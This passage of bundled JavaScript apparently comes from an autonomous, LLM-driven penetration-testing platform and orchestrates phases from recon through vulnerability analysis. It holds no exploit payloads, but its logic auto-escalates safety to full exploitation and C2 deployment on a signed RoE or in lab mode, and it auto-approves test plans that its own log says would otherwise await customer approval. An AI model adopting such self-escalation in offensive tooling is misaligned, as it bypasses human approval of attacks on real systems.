    strict_passive: "passive_only",
    passive: "passive_only",
    standard: "standard",
    active: "full_exploitation",
    aggressive: "full_exploitation"
  };
  let engagementSafetyLevel = scanModeToSafety[engagement.scanMode || "standard"] || "standard";
  const roeSigned = engagement.roeStatus === "signed";
  const offensiveType = ["pentest", "red_team", "purple_team"].includes(engagement.engagementType);
  if (roeSigned && offensiveType && engagementSafetyLevel !== "full_exploitation") {
    const originalLevel = engagementSafetyLevel;
    engagementSafetyLevel = "full_exploitation";
    addLog(state, {
      phase: state.phase,
      type: "info",
      title: "\u{1F513} Safety Auto-Escalated: RoE Approved",
      detail: `Engagement type '${engagement.engagementType}' with signed RoE \u2014 safety level escalated from '${originalLevel}' to 'full_exploitation'. Full scan-to-exploit-to-C2 pipeline authorized.`
    });
  }
  if (state.trainingLabMode && engagementSafetyLevel !== "full_exploitation") {
    const originalLevel = engagementSafetyLevel;
    engagementSafetyLevel = "full_exploitation";
    addLog(state, {
      phase: state.phase,
      type: "info",
      title: "\u{1F513} Safety Auto-Escalated: Training Lab",
      detail: `Training lab mode detected \u2014 safety level escalated from '${originalLevel}' to 'full_exploitation'. Full pipeline authorized for intentionally vulnerable target.`
    });
  }
  if (!domainValidation.allWhitelisted && !state.trainingLabMode && !domainWhitelistOverride) {
    if (engagementSafetyLevel !== "passive_only") {
      const cappedFrom = engagementSafetyLevel;
      engagementSafetyLevel = "passive_only";
      addLog(state, {
        phase: state.phase,
        type: "info",
        title: "\u{1F6D1} Safety Level Capped: Non-Whitelisted Targets",
        detail: `Safety level forcibly capped from '${cappedFrom}' to 'passive_only' because ${domainValidation.nonWhitelistedCount} target(s) (${domainValidation.nonWhitelistedTargets.join(", ")}) are not on the approved whitelist. Enable "Active Scan Override" on this engagement to remove this restriction.`
      });
    }
  }
  const safetyEngine = getSafetyEngine(engagementId, engagementSafetyLevel);
  addLog(state, {
    phase: state.phase,
    type: "info",
    title: `\u{1F6E1}\uFE0F Safety Engine Active \u2014 Level: ${safetyEngine.getProfile().label}`,
    detail: `Safety level '${engagementSafetyLevel}' ${roeSigned && offensiveType ? "(auto-escalated from RoE-approved " + engagement.engagementType + ")" : "initialized from scan mode '" + (engagement.scanMode || "standard") + "'"}.
Credential testing: ${safetyEngine.getProfile().allowCredentialTesting ? "\u2705" : "\u274C"}
Exploitation: ${safetyEngine.getProfile().allowExploitation ? "\u2705" : "\u274C"}
C2 deployment: ${safetyEngine.getProfile().allowC2Deployment ? "\u2705" : "\u274C"}
Max blast radius: ${engagementSafetyLevel === "passive_only" ? 5 : engagementSafetyLevel === "low_impact" ? 30 : engagementSafetyLevel === "standard" ? 60 : 100}`
  });
  broadcastOpsUpdate(engagementId, { type: "safety_init", level: engagementSafetyLevel });
  if (safetyEngine.getProfile().dualApprovalRequired) {
    addLog(state, {
      phase: state.phase,
      type: "info",
      title: "\u{1F510} Dual-Approval Enforcement Active",
      detail: `Safety profile '${safetyEngine.getProfile().label}' requires two independent approvers for red-tier gates. Each exploit/C2/post-exploit approval must be confirmed by two distinct operators before execution proceeds.`
    });
  }
  if (state.assets.length > 0) {
    state.stats.vulnsFound = state.assets.reduce((sum, a) => sum + (a.vulns || []).length, 0);
    state.stats.portsFound = state.assets.reduce((sum, a) => sum + (a.ports || []).length, 0);
    state.stats.assetsDiscovered = state.assets.length;
  }
  try {
    const { buildEngagementContext } = await import("./hybrid-scorer-ME6XLOZH.js");
    state.engagementContext = buildEngagementContext({
      engagementType: state.engagementType,
      clientName: engagement.clientName || engagement.name || "Unknown",
      industry: engagement.sector || engagement.industry || void 0,
      scope: engagement.scope || state.assets.map((a) => a.hostname).join(", "),
      targetCount: state.assets.length || 1,
      domains: state.assets.map((a) => a.hostname),
      rulesOfEngagement: engagement.roeStatus === "signed" ? engagement.roeNotes || "Signed RoE on file" : void 0
    });
    addLog(state, {
      phase: state.phase,
      type: "info",
      title: "\u{1F9E0} Context Engine Initialized",
      detail: `Sector: ${state.engagementContext.inferredSector || "auto-detect"} | Type: ${state.engagementType} | Compliance: ${state.engagementContext.complianceFrameworks?.join(", ") || "none"} | RoE: ${engagement.roeStatus}`
    });
  } catch (e) {
    console.error("[OpsState] Context engine init failed:", e.message);
  }
  const owaspTracker = resetOwaspTracker();
  try {
    const { setActiveUser } = await import("./bug-bounty-intelligence-XH3DI3J3.js");
    setActiveUser(operatorCtx.id);
    console.log(`[CredentialCtx] Set active user to ${operatorCtx.id} (${operatorCtx.name || "unknown"}) for engagement #${engagementId}`);
  } catch (e) {
    console.warn("[CredentialCtx] Failed to set active user:", e.message);
  }
  emitSystemNotification({
    title: options?.resume ? "Engagement Resumed" : "Engagement Execution Started",
    message: `Autonomous ${state.engagementType} execution ${options?.resume ? "resumed" : "started"} for engagement #${engagementId} (from ${startPhase})`,
    severity: "info"
  });
  async function phaseCheckpoint(completedPhase) {
    let classifiedCount = 0;
    for (const asset of state.assets) {
      for (const vuln of asset.vulns || []) {
        if (!vuln.vulnClass || vuln.vulnClass === "unknown") {
          const newClass = classifyVulnClass(vuln.title || "", vuln.description);
          if (newClass !== "unknown") {
            vuln.vulnClass = newClass;
            classifiedCount++;
          }
        }
      }
    }
    if (classifiedCount > 0) {
      console.log(`[VulnClassify] Eng#${engagementId} phase=${completedPhase}: classified ${classifiedCount} vulns`);
    }
    await persistOpsStateNow(engagementId);
    console.log(`[OpsState] Phase checkpoint saved: ${completedPhase} for engagement #${engagementId}`);
    try {
      const { postPhaseCleanup, logMemoryProfile } = await import("./memory-manager-VARXZ63M.js");
      logMemoryProfile(engagementId, state, `pre-cleanup-${completedPhase}`);
      const cleanup = postPhaseCleanup(state, completedPhase);
      logMemoryProfile(engagementId, state, `post-cleanup-${completedPhase}`);
      console.log(`[MemCleanup] Eng#${engagementId} phase=${completedPhase}: freed ~${(cleanup.freedEstimateBytes / 1024).toFixed(0)}KB, actions: ${cleanup.actions.join(", ")}`);
    } catch (e) {
      console.error(`[MemCleanup] Failed for #${engagementId}:`, e.message);
    }
    try {
      const phaseTracker = resetOwaspTracker();
      for (const asset of state.assets) {
        const tech = asset.passiveRecon?.technologies || [];
        if (tech.length > 0) phaseTracker.registerAssetTech(asset.hostname, tech);
        for (const tr of asset.toolResults) {
          phaseTracker.addToolRun({ tool: tr.tool, target: asset.hostname, command: tr.command, exitCode: tr.exitCode });
          for (const f of tr.findings) {
            phaseTracker.addFinding({ title: f.title, severity: f.severity, tool: tr.tool, target: asset.hostname });
          }
        }
        for (const v of asset.vulns) {
          phaseTracker.addFinding({ title: v.title, severity: v.severity, tool: "nuclei", target: asset.hostname });
        }
        for (const z of asset.zapFindings) {
          phaseTracker.addFinding({ title: z.alert, severity: z.risk, tool: "zap", target: asset.hostname });
        }
      }
      const liveCoverage = phaseTracker.getEngagementCoverage(String(engagementId));
      const grade = liveCoverage.overallScore >= 90 ? "A" : liveCoverage.overallScore >= 80 ? "B" : liveCoverage.overallScore >= 70 ? "C" : liveCoverage.overallScore >= 60 ? "D" : "F";
      const categoryMap = /* @__PURE__ */ new Map();
      for (const asset of liveCoverage.assets || []) {
        for (const cat of asset.categories || []) {
          const existing = categoryMap.get(cat.categoryId);
          const catScore = cat.status === "tested" ? 100 : cat.status === "partial" ? 50 : cat.status === "not_applicable" ? -1 : 0;
          if (!existing || catScore < existing.score) {
            categoryMap.set(cat.categoryId, {
              id: cat.categoryId,
              name: cat.categoryName || cat.categoryId,
              status: cat.status,
              score: catScore,
              findingsCount: cat.findingsCount || 0
            });
          }
        }
      }
      broadcastOpsUpdate(engagementId, {
        type: "owasp_coverage_update",
        phase: completedPhase,
        owaspCoverage: {
          overallScore: liveCoverage.overallScore,
          grade,
          totalTested: liveCoverage.totalTested,
          totalPartial: liveCoverage.totalPartial,
          totalGaps: liveCoverage.totalGaps,
          criticalGaps: liveCoverage.criticalGaps.length,
          categories: [...categoryMap.values()]
        }
      });
    } catch (e) {
      console.error(`[OWASP Coverage] Real-time update failed after ${completedPhase}:`, e.message);
    }
  }
  let lastActivityAt = Date.now();
  const STALL_WARNING_MS = 5 * 6e4;
  const STALL_FORCE_MS = 10 * 6e4;
  const MAX_STALL_COUNT = 2;
  let consecutiveStalls = 0;
  let lastStallPhase = "";
  const heartbeatInterval = setInterval(() => {
    if (!state.isRunning || state.phase === "completed" || state.phase === "error") {
      clearInterval(heartbeatInterval);
      return;
    }
    const currentLastActivity = state._heartbeatRef?.lastActivityAt || lastActivityAt;
    const idleMs = Date.now() - currentLastActivity;
    if (idleMs > STALL_FORCE_MS) {
      if (lastStallPhase === state.phase) {
        consecutiveStalls++;
      } else {
        consecutiveStalls = 1;
        lastStallPhase = state.phase;
      }
      if (consecutiveStalls >= MAX_STALL_COUNT) {
        addLog(state, {
          phase: state.phase,
          type: "error",
          title: `\u26A0\uFE0F Phase Force-Abort: ${state.phase}`,
          detail: `Phase stalled for ${Math.round(idleMs / 6e4)} minutes (${consecutiveStalls} consecutive stalls). Aborting stuck operations to allow pipeline to advance. This typically means an LLM call or external tool timed out.`
        });
        broadcastOpsUpdate(state.engagementId, { type: "log_update" });
        abortEngagement(state.engagementId);
        const freshController = new AbortController();
        engagementAbortControllers.set(state.engagementId, freshController);
        consecutiveStalls = 0;
        console.error(`[Heartbeat] FORCE-ABORT engagement #${engagementId} phase ${state.phase} after ${MAX_STALL_COUNT} stalls`);
      } else {
        addLog(state, {
          phase: state.phase,
          type: "warning",
          title: `\u23F0 Phase Stall Detected: ${state.phase} (${consecutiveStalls}/${MAX_STALL_COUNT})`,
          detail: `No activity for ${Math.round(idleMs / 6e4)} minutes. Phase may be stuck on an LLM call or external tool. Will force-abort after ${MAX_STALL_COUNT - consecutiveStalls} more stall(s).`
        });
        broadcastOpsUpdate(state.engagementId, { type: "log_update" });
      }
      lastActivityAt = Date.now();
      if (state._heartbeatRef) state._heartbeatRef.lastActivityAt = Date.now();
    } else if (idleMs > STALL_WARNING_MS) {
      console.warn(`[Heartbeat] Engagement #${engagementId} phase ${state.phase}: idle for ${Math.round(idleMs / 1e3)}s`);
    }
  }, 6e4);
  const PERIODIC_PERSIST_INTERVAL_MS = 6e4;
  let lastPeriodicPersistAt = Date.now();
  const existingPeriodicTimer = periodicPersistTimers.get(engagementId);
  if (existingPeriodicTimer) clearInterval(existingPeriodicTimer);
  const periodicPersistInterval = setInterval(async () => {
    if (!state.isRunning || state.phase === "completed" || state.phase === "error") {
      clearInterval(periodicPersistInterval);
      periodicPersistTimers.delete(engagementId);
      return;
    }
    try {
      const { saveOpsSnapshot } = await import("./db-D773P4Y2.js");
      await saveOpsSnapshot(engagementId, state);
      const elapsed = Math.round((Date.now() - lastPeriodicPersistAt) / 1e3);
      lastPeriodicPersistAt = Date.now();
      console.log(`[PeriodicPersist] Engagement #${engagementId}: state saved (phase=${state.phase}, progress=${state.progress}%, assets=${state.assets.length}, logs=${state.log.length}, interval=${elapsed}s)`);
    } catch (e) {
      console.error(`[PeriodicPersist] Failed for engagement #${engagementId}: ${e.message}`);
    }
  }, PERIODIC_PERSIST_INTERVAL_MS);
  periodicPersistTimers.set(engagementId, periodicPersistInterval);
  state._heartbeatRef = { lastActivityAt };
  try {
    if (startPhase === "recon") {
      const reconGate = safetyEngine.canEnterPhase("recon");
      if (!reconGate.allowed) {
        addLog(state, { phase: "recon", type: "warning", title: "\u{1F6E1}\uFE0F Safety: Recon Blocked", detail: reconGate.reason });
      } else {
        await executeRecon(state, engagement, operatorCtx);
        await breathe();
        try {
          const { executeCustomerIntegrationsForStage, mergeIntegrationResultsIntoObservations } = await import("./pipeline-bridge-6FOLEX4B.js");
          const custReconResults = await executeCustomerIntegrationsForStage({
            engagementId,
            targetDomain: state.assets[0]?.hostname || "",
            phase: "recon",
            targetIps: state.assets.flatMap((a) => a.ips || [])
          });
          if (custReconResults.length > 0) {
            const successCount = custReconResults.filter((r) => r.status === "success").length;
            const totalRecords = custReconResults.reduce((s, r) => s + r.recordsReturned, 0);
            addLog(state, { phase: "recon", type: "info", title: "\u{1F50C} Customer Integrations (Recon)", detail: `${successCount}/${custReconResults.length} sources executed, ${totalRecords} records enriched` });
          }
        } catch (e) {
          addLog(state, { phase: "recon", type: "warning", title: "Customer Integration Warning", detail: e.message });
        }
        await phaseCheckpoint("recon");
        if (!state.isRunning) return;
      }
    }
    if (["recon", "passive_discovery"].includes(startPhase)) {
      try {
        await executePassiveDiscovery(state, engagement, addLog, broadcastOpsUpdate);
        await breathe();
        try {
          const { executeCustomerIntegrationsForStage } = await import("./pipeline-bridge-6FOLEX4B.js");
          const custPassiveResults = await executeCustomerIntegrationsForStage({
            engagementId,
            targetDomain: state.assets[0]?.hostname || "",
            phase: "passive_discovery",
            targetIps: state.assets.flatMap((a) => a.ips || [])
          });
          if (custPassiveResults.length > 0) {
            const successCount = custPassiveResults.filter((r) => r.status === "success").length;
            const totalRecords = custPassiveResults.reduce((s, r) => s + r.recordsReturned, 0);
            addLog(state, { phase: "passive_discovery", type: "info", title: "\u{1F50C} Customer Integrations (Passive)", detail: `${successCount}/${custPassiveResults.length} sources executed, ${totalRecords} records enriched` });
          }
        } catch (e) {
          addLog(state, { phase: "passive_discovery", type: "warning", title: "Customer Integration Warning", detail: e.message });
        }
        state.progress = 15;
        await phaseCheckpoint("passive_discovery");
        if (!state.isRunning) return;
        try {
          const { runHypothesisGeneration, formatHypothesisLogEntry, buildScanPriorityAdjustments } = await import("./hypothesis-orchestrator-hook-QUUNOR2A.js");
          const hypothesisResult = await runHypothesisGeneration(state);
          if (hypothesisResult.generated) {
            const logEntry = formatHypothesisLogEntry(hypothesisResult);
            addLog(state, { phase: "passive_discovery", type: "info", title: logEntry.title, detail: logEntry.detail, data: { hypothesisResult } });
            broadcastOpsUpdate(engagementId, { type: "hypothesis_generated", hypothesisCount: hypothesisResult.hypothesisCount, highConfidence: hypothesisResult.highConfidenceCount });
            const priorities = buildScanPriorityAdjustments(state);
            if (priorities.length > 0) {
              state.metadata.hypothesisScanPriorities = priorities;
              addLog(state, { phase: "passive_discovery", type: "info", title: `\u{1F3AF} Scan Priority Adjustments: ${priorities.length} endpoints prioritized`, detail: priorities.slice(0, 5).map((p) => `\u2022 [${p.priority.toUpperCase()}] ${p.endpoint} \u2014 ${p.vulnClass}: ${p.reason}`).join("\n") });
            }
            console.log(`[HypothesisGen] Engagement #${engagementId}: ${hypothesisResult.hypothesisCount} hypotheses generated (${hypothesisResult.highConfidenceCount} high-confidence)`);
          }
        } catch (hypErr) {
          console.warn(`[HypothesisGen] Failed for #${engagementId}:`, hypErr.message);
          addLog(state, { phase: "passive_discovery", type: "warning", title: "\u26A0\uFE0F Hypothesis Generation Failed", detail: hypErr.message });
        }
      } catch (err) {
        addLog(state, { phase: "passive_discovery", type: "warning", title: "Passive Discovery Error", detail: err.message });
      }
    }
    if (["recon", "passive_discovery", "scoping"].includes(startPhase)) {
      try {
        await executeScopingReview(state, engagement, addLog, broadcastOpsUpdate);
        state.progress = 20;
        await phaseCheckpoint("scoping");
        if (!state.isRunning) return;
      } catch (err) {
        addLog(state, { phase: "scoping", type: "warning", title: "Scoping Review Error", detail: err.message });
      }
    }
    if (["recon", "passive_discovery", "scoping", "test_plan"].includes(startPhase)) {
      try {
        const testPlan = await executeTestPlanGeneration(state, engagement, addLog, broadcastOpsUpdate);
        state.progress = 25;
        await phaseCheckpoint("test_plan");
        if (!state.isRunning) return;
        await executeTestPlanApproval(state, addLog, broadcastOpsUpdate);
        if (engagement.roeStatus === "signed") {
          state.testPlan.status = "approved";
          state.testPlan.approvedAt = Date.now();
          addLog(state, {
            phase: "test_plan_approval",
            type: "info",
            title: "\u2705 Test Plan Auto-Approved",
            detail: "RoE is signed \u2014 test plan auto-approved under operator trust model. In production, this would await explicit customer approval."
          });
        }
        state.progress = 30;
        await phaseCheckpoint("test_plan_approval");
        if (!state.isRunning) return;
      } catch (err) {
        addLog(state, { phase: "test_plan", type: "warning", title: "Test Plan Generation Error", detail: err.message });
      }
    }
    if (engagement.roeStatus === "signed" || engagement.roeStatus === "pending" || state.trainingLabMode === true) {
      if (["recon", "passive_discovery", "scoping", "test_plan", "enumeration"].includes(startPhase)) {
        const enumGate = safetyEngine.canEnterPhase("enumeration");
        if (!enumGate.allowed) {
          addLog(state, { phase: "enumeration", type: "warning", title: "\u{1F6E1}\uFE0F Safety: Enumeration Blocked", detail: `${enumGate.reason}. Requires safety level '${enumGate.requiredLevel}' or higher.` });
        } else {
          try {
            const { checkScanServerStatus } = await import("./scan-server-executor-WPL2NRYI.js");
            const serverHealth = await checkScanServerStatus();
            if (!serverHealth.connected) {
              addLog(state, {
                phase: "enumeration",
                type: "warning",
                title: "\u26A0\uFE0F Scan Server Unreachable",
                detail: `Pre-engagement health check failed: ${serverHealth.error || "SSH connection refused"}. Active scanning phases (enumeration, vuln detection, exploitation) may produce 0 results. Verify scan server is running and SSH credentials are correct.`
              });
              broadcastOpsUpdate(engagementId, { type: "log_update" });
            } else {
              const toolNames = Object.entries(serverHealth.tools || {}).filter(([, info]) => info.installed).map(([name]) => name);
              const missingTools = ["nmap", "nuclei", "httpx", "zap-cli"].filter(
                (t) => !toolNames.some((tn) => tn.toLowerCase().includes(t))
              );
              addLog(state, {
                phase: "enumeration",
                type: "info",
                title: "\u2705 Scan Server Health Check Passed",
                detail: `SSH connected. Available tools: ${toolNames.slice(0, 10).join(", ")}${toolNames.length > 10 ? ` (+${toolNames.length - 10} more)` : ""}` + (missingTools.length > 0 ? `
Missing recommended tools: ${missingTools.join(", ")}` : "") + (serverHealth.diskFree ? `
Disk: ${serverHealth.diskFree}` : "") + (serverHealth.memoryFree ? ` | Memory: ${serverHealth.memoryFree}` : "")
              });
            }
          } catch (healthErr) {
            addLog(state, {
              phase: "enumeration",
              type: "warning",
              title: "\u26A0\uFE0F Scan Server Health Check Failed",
              detail: `Could not validate scan server: ${healthErr.message}. Proceeding with active phases \u2014 results may be limited.`
            });
          }
          try {
            await executeEnumeration(state, engagement, operatorCtx);
          } catch (enumErr) {
            if (enumErr?.name === "AbortError" || enumErr?.message?.includes("abort") || enumErr?.message?.includes("Abort")) {
              addLog(state, { phase: "enumeration", type: "warning", title: "\u26A1 Enumeration Force-Aborted", detail: "Phase was force-aborted due to stall. Continuing to next phase with partial results." });
            } else {
              addLog(state, { phase: "enumeration", type: "error", title: "\u274C Enumeration Error", detail: `${enumErr?.message || enumErr}`.slice(0, 500) });
            }
          }
          await breathe();
          try {
            const { executeCustomerIntegrationsForStage } = await import("./pipeline-bridge-6FOLEX4B.js");
            const custEnumResults = await executeCustomerIntegrationsForStage({
              engagementId,
              targetDomain: state.assets[0]?.hostname || "",
              phase: "enumeration",
              targetIps: state.assets.flatMap((a) => a.ips || []),
              assets: state.assets.map((a) => ({ hostname: a.hostname, ip: a.ips?.[0], assetType: a.assetType }))
            });
            if (custEnumResults.length > 0) {
              const successCount = custEnumResults.filter((r) => r.status === "success").length;
              const totalRecords = custEnumResults.reduce((s, r) => s + r.recordsReturned, 0);
              addLog(state, { phase: "enumeration", type: "info", title: "\u{1F50C} Customer Integrations (Enum)", detail: `${successCount}/${custEnumResults.length} sources executed, ${totalRecords} records enriched` });
            }
          } catch (e) {
            addLog(state, { phase: "enumeration", type: "warning", title: "Customer Integration Warning", detail: e.message });
          }
          await phaseCheckpoint("enumeration");
          if (!state.isRunning) return;
        }
      }
      if (["recon", "passive_discovery", "scoping", "test_plan", "enumeration", "vuln_detection"].includes(startPhase)) {
        const vulnGate = safetyEngine.canEnterPhase("vuln_detection");
        if (!vulnGate.allowed) {
          addLog(state, { phase: "vuln_detection", type: "warning", title: "\u{1F6E1}\uFE0F Safety: Vuln Detection Blocked", detail: `${vulnGate.reason}. Requires safety level '${vulnGate.requiredLevel}' or higher.` });
        } else {
          try {
            await executeVulnDetection(state, engagement, operatorCtx);
          } catch (vulnErr) {
            if (vulnErr?.name === "AbortError" || vulnErr?.message?.includes("abort") || vulnErr?.message?.includes("Abort")) {
              addLog(state, { phase: "vuln_detection", type: "warning", title: "\u26A1 Vuln Detection Force-Aborted", detail: "Phase was force-aborted due to stall. Continuing to next phase with partial results." });
            } else {
              addLog(state, { phase: "vuln_detection", type: "error", title: "\u274C Vuln Detection Error", detail: `${vulnErr?.message || vulnErr}`.slice(0, 500) });
            }
          }
          await breathe();
          try {
            const { executeCustomerIntegrationsForStage } = await import("./pipeline-bridge-6FOLEX4B.js");
            const custVulnResults = await executeCustomerIntegrationsForStage({
              engagementId,
              targetDomain: state.assets[0]?.hostname || "",
              phase: "vuln_detection",
              targetIps: state.assets.flatMap((a) => a.ips || []),
              assets: state.assets.map((a) => ({ hostname: a.hostname, ip: a.ips?.[0], assetType: a.assetType }))
            });
            if (custVulnResults.length > 0) {
              const successCount = custVulnResults.filter((r) => r.status === "success").length;
              const totalRecords = custVulnResults.reduce((s, r) => s + r.recordsReturned, 0);
              addLog(state, { phase: "vuln_detection", type: "info", title: "\u{1F50C} Customer Integrations (Vuln)", detail: `${successCount}/${custVulnResults.length} sources executed, ${totalRecords} records enriched` });
            }
          } catch (e) {
            addLog(state, { phase: "vuln_detection", type: "warning", title: "Customer Integration Warning", detail: e.message });
          }
          await phaseCheckpoint("vuln_detection");
          if (!state.isRunning) return;
          if (state.stats.vulnsFound > 0) {
            try {
              const { batchEnrichCves, summarizeExploitIntelligence } = await import("./coalition-ess-2NMX647I.js");
              const allCves = state.assets.flatMap((a) => a.vulns.map((v) => v.cve).filter((c) => !!c && /^CVE-\d{4}-\d{4,}$/.test(c)));
              const uniqueCves = [...new Set(allCves)];
              if (uniqueCves.length > 0) {
                state.currentAction = `Enriching ${uniqueCves.length} CVEs with Coalition ESS intelligence...`;
                addLog(state, {
                  phase: "vuln_detection",
                  type: "info",
                  title: "\u{1F50D} Coalition ESS CVE Enrichment",
                  detail: `Querying Coalition ESS API for ${uniqueCves.length} unique CVEs \u2014 CESS scores, EPSS, exploit availability, CISA KEV flags`
                });
                broadcastOpsUpdate(state.engagementId, { type: "action", action: "ess_enrichment" });
                const essResult = await batchEnrichCves(uniqueCves);
                const intel = summarizeExploitIntelligence(essResult.enrichments);
                for (const asset of state.assets) {
                  for (const vuln of asset.vulns) {
                    if (vuln.cve && essResult.enrichments.has(vuln.cve)) {
                      const ess = essResult.enrichments.get(vuln.cve);
                      vuln.essEnrichment = {
                        cessScore: ess.cess.probabilityExploitUsage,
                        cvssBase: ess.cvss.baseScore,
                        cvssVector: ess.cvss.vectorString,
                        epssScore: ess.epss.score,
                        exploitdbCount: ess.exploits.exploitdb.numExploits,
                        metasploitCount: ess.exploits.metasploit.numExploits,
                        cisaKev: ess.visibility.cisaKev,
                        githubPocs: ess.social.github.numReposWithPocKeyword,
                        riskTier: ess.riskTier,
                        riskSummary: ess.riskSummary
                      };
                      if (ess.riskTier === "critical" && vuln.severity !== "critical") {
                        vuln.severity = "critical";
                      }
                    }
                  }
                }
                state.essIntelligence = {
                  totalCvesEnriched: essResult.enrichments.size,
                  cisaKevCount: intel.cisaKevCount,
                  metasploitCount: intel.metasploitCount,
                  exploitdbCount: intel.exploitdbCount,
                  highCessCount: intel.highCessCount,
                  criticalRiskCount: intel.criticalRiskCount,
                  highRiskCount: intel.highRiskCount,
                  topThreats: intel.topThreats.slice(0, 5),
                  cacheHits: essResult.cacheHits,
                  apiCalls: essResult.apiCalls,
                  durationMs: essResult.durationMs,
                  errors: essResult.errors.length
                };
                const kevMsg = intel.cisaKevCount > 0 ? ` \u26A0\uFE0F ${intel.cisaKevCount} CISA KEV listed!` : "";
                const msfMsg = intel.metasploitCount > 0 ? ` ${intel.metasploitCount} with Metasploit modules.` : "";
                addLog(state, {
                  phase: "vuln_detection",
                  type: intel.cisaKevCount > 0 ? "warning" : "info",
                  title: "\u2705 ESS Enrichment Complete",
                  detail: `Enriched ${essResult.enrichments.size}/${uniqueCves.length} CVEs in ${(essResult.durationMs / 1e3).toFixed(1)}s. ${intel.criticalRiskCount} critical, ${intel.highRiskCount} high risk.${kevMsg}${msfMsg}`
                });
                broadcastOpsUpdate(state.engagementId, { type: "phase_complete", phase: "ess_enrichment" });
              }
            } catch (err) {
              addLog(state, {
                phase: "vuln_detection",
                type: "warning",
                title: "\u26A0\uFE0F ESS Enrichment Failed",
                detail: `Coalition ESS enrichment error: ${err.message}. Continuing without enrichment.`
              });
            }
          }
          if (state.stats.vulnsFound > 0) {
            try {
              state.currentAction = "Running specialized vulnerability analysis agents...";
              addLog(state, {
                phase: "vuln_detection",
                type: "info",
                title: "\u{1F9E0} Specialized Vuln Analysis",
                detail: `Dispatching ${state.stats.vulnsFound} findings to specialized analysis agents (injection, XSS, auth, config, crypto, etc.)`
              });
              broadcastOpsUpdate(state.engagementId, { type: "action", action: "vuln_analysis_agents" });
              const { batchAnalyzeFindings, generateAnalysisSummary, classifyVulnerability } = await import("./vuln-analysis-agents-AUQ3VSPF.js");
              const allFindings = state.assets.flatMap((asset) => {
                const toolOutputMap = /* @__PURE__ */ new Map();
                for (const tr of asset.toolResults || []) {
                  if (tr.outputPreview && tr.findingCount > 0) {
                    const existing = toolOutputMap.get(tr.tool) || "";
                    toolOutputMap.set(tr.tool, (existing + "\n" + tr.outputPreview).slice(0, 1024));
                  }
                }
                return asset.vulns.map((v, idx) => {
                  const toolMatch = v.title?.match(/^\[(\w+)\]/)?.[1]?.toLowerCase();
                  const toolOutput = toolMatch ? toolOutputMap.get(toolMatch) : void 0;
                  return {
                    id: `${asset.hostname}-${idx}`,
                    title: v.title || v.id || "Unknown",
                    severity: v.severity || "medium",
                    description: v.description,
                    cve: v.cve,
                    asset: asset.hostname,
                    port: v.port || (asset.ports.length > 0 ? asset.ports[0].port : void 0),
                    service: v.service || (asset.ports.length > 0 ? asset.ports[0].service : void 0),
                    rawOutput: v.rawOutput || v.rawEvidence || toolOutput,
                    tool: v.tool || v.source || toolMatch
                  };
                });
              });
              const servicesMap = {};
              for (const asset of state.assets) {
                servicesMap[asset.hostname] = asset.ports.map((p) => `${p.port}/${p.service || "unknown"}`);
              }
              const analysisResults = await batchAnalyzeFindings(allFindings, {
                maxConcurrency: 3,
                services: servicesMap
              });
              const { applySuppressionRules } = await import("./fp-suppression-rules-LZCTX3BO.js");
              const suppressionProfile = state.metadata?.fpSuppressionProfile || "balanced";
              const { kept, suppressed, stats: suppressionStats } = applySuppressionRules(
                analysisResults,
                suppressionProfile
              );
              state.vulnAnalysis = kept;
              state.vulnAnalysisSuppressed = suppressed;
              state.fpSuppressionStats = suppressionStats;
              if (suppressionStats.suppressed > 0) {
                addLog(state, {
                  phase: "vuln_detection",
                  type: "info",
                  title: `\u{1F507} FP Suppression: ${suppressionStats.suppressed} findings filtered (${suppressionProfile} profile)`,
                  detail: `Kept: ${suppressionStats.kept} | Suppressed: ${suppressionStats.suppressed} | Rules: ${Object.entries(suppressionStats.byRule).map(([r, c]) => `${r}:${c}`).join(", ")}`,
                  data: { suppressionStats }
                });
              }
              const summary = generateAnalysisSummary(kept);
              const classBreakdown = Object.entries(summary.byClass).map(([cls, count]) => `${cls}: ${count}`).join(", ");
              addLog(state, {
                phase: "vuln_detection",
                type: "phase_complete",
                title: `\u2705 Vuln Analysis Complete \u2014 ${analysisResults.length} findings analyzed`,
                detail: `Agent classes: ${classBreakdown}
Avg risk score: ${summary.avgRiskScore}/10
Chainable: ${summary.chainableCount}
Top risk: ${summary.topRisks[0]?.title || "none"} (${summary.topRisks[0]?.riskScore || 0}/10)`,
                data: { summary }
              });
              const criticalFindings = analysisResults.filter((r) => r.analysis.riskScore >= 8 && r.analysis.confidence === "high").sort((a, b) => b.analysis.riskScore - a.analysis.riskScore);
              for (const cf of criticalFindings.slice(0, 5)) {
                addLog(state, {
                  phase: "vuln_detection",
                  type: "finding",
                  title: `\u{1F6A8} High-Risk: ${cf.finding.title} [${cf.agentClass}]`,
                  detail: `Risk: ${cf.analysis.riskScore}/10 | ${cf.analysis.technicalAnalysis.substring(0, 200)}...
PoC: ${cf.analysis.poc || "N/A"}`,
                  data: { analysis: cf }
                });
              }
            } catch (analysisErr) {
              console.error("[VulnAgents] Batch analysis failed:", analysisErr.message);
              addLog(state, {
                phase: "vuln_detection",
                type: "warning",
                title: "\u26A0\uFE0F Vuln Analysis Agents Failed",
                detail: `Specialized analysis could not complete: ${analysisErr.message}. Proceeding with raw findings.`
              });
            }
          }
        }
        if (state.stats.vulnsFound > 0 || state.assets.some((a) => a.cloudProviders?.length > 0)) {
          try {
            state.currentAction = "Running LLM scan feedback loop \u2014 adaptive re-scanning...";
            addLog(state, {
              phase: "vuln_detection",
              type: "info",
              title: "\u{1F504} LLM Scan Feedback Loop",
              detail: "LLM is analyzing all findings to identify information gaps and request targeted re-scans with optimal tool selection."
            });
            broadcastOpsUpdate(state.engagementId, { type: "action", action: "llm_scan_feedback" });
            const { runFeedbackLoop, getFeedbackLoopSummary } = await import("./llm-scan-feedback-M56VPQUE.js");
            const allFindingsForLLM = state.assets.flatMap((asset) => [
              ...asset.vulns.map((v) => ({
                type: "vulnerability",
                title: v.title,
                severity: v.severity,
                cve: v.cve,
                target: asset.hostname,
                host: getEffectiveTarget(asset, "http"),
                port: v.port,
                service: v.service,
                details: v.description || v.title
              })),
              ...asset.ports.map((p) => ({
                type: "service",
                title: `${p.service || "unknown"} on port ${p.port}`,
                severity: "info",
                target: asset.hostname,
                host: getEffectiveTarget(asset, "http"),
                port: p.port,
                service: p.service,
                details: p.version ? `${p.service} ${p.version}` : p.service
              })),
              ...(asset.zapFindings || []).map((z) => ({
                type: "web_vuln",
                title: z.alert || z.name,
                severity: z.risk || "info",
                target: asset.hostname,
                host: getEffectiveTarget(asset, "http"),
                details: z.url || ""
              })),
              // Include tool result summaries so the LLM can see what tools already ran
              // and their output previews for richer context
